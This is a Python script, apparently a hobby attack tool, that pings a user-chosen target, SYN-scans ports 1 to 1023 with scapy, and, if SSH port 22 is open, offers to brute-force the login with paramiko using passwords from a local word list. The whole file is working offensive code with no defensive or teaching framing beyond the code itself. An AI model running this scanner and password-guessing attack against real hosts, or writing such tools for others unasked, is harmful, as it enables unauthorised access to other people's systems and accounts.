from scapy.all import *
from scapy.layers.inet import IP, TCP, ICMP
import paramiko


target = input("Set target IP: ")
registered_ports = range(1, 1024)
open_ports = []


def scanport(port):
    source_port = RandShort()
    conf.verb = 0
    synchronization_packet = sr1(IP(dst=target) / TCP(sport=source_port, dport=port, flags="S"), timeout=0.5)
    if str(type(synchronization_packet)) != "<class 'NoneType'>":
        if synchronization_packet.haslayer(TCP):
            if synchronization_packet.getlayer(TCP).flags == 0x12:
                sr(IP(dst=target)/TCP(sport=source_port, dport=port, flags='R'), timeout=2)
                return True
            else:
                return False
        else:
            print('Data do not exist.')
            return False
    else:
        print('Sync packet do not exist')
        return False


def check_target_availability():
    try:
        conf.verb = 0
        icmp_sender = sr1(IP(dst=target)/ICMP(), timeout=3)
        if icmp_sender:
            print('Host is up')
            for ports in registered_ports:
                status = scanport(ports)
                if status is True:
                    print(f'Port {ports} is open.')
                    open_ports.append(ports)
            print('Scan finished.\n')
            return True
        else:
            print('Host is down')
            return False
    except Exception as err:
        print(f'Exception:\n {err}')
        return False


def brute_force(port):
    with open("PasswordList.txt", 'r') as passwd_list:
        password_list = passwd_list.read().split('\n')
        user = input("Enter SSH Username: ")
        sshconn = paramiko.SSHClient()
        sshconn.set_missing_host_key_policy(paramiko.AutoAddPolicy)
        for passwd in password_list:
            try:
                sshconn.connect(target, port=int(port), username=user, password=passwd, timeout=1)
                print(f"[+] Password '{passwd}' accepted. User: '{user}' [+]")
                sshconn.close()
                break
            except:
                print(f"[-] Password '{passwd}' failed [-]")


def main():
    print('Working, Please wait.')
    if check_target_availability():
        if 22 in open_ports:
            print(f'List of open ports: {open_ports}')
            bf = input('Do you wan to perform brute-force attack? Yes/No ')
            if bf == 'yes'.lower() or bf == 'y'.lower():
                brute_force(22)
            else:
                exit()
        print('Exiting...')
    else:
        print(f'Target {target} is unavailable.')


if __name__ == '__main__':
    main()

